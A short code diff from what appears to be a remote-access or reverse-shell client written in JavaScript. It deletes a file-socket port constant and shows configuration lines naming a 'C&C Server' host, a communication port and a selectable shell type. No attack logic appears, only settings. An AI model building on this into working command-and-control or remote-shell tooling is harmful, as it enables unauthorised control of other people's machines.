@@ -16,7 +16,6 @@ const _options = {
 }
 
 // flag variable to let the client know if it needs to reconnect to the server
-const _fsPort = 2223 // File socket port
 const _comPort = 443 // Communication Socket port
 const _host = '127.0.0.1' // C&C Server
 const _shellType = "sh" //cmd.exe, zsh, sh
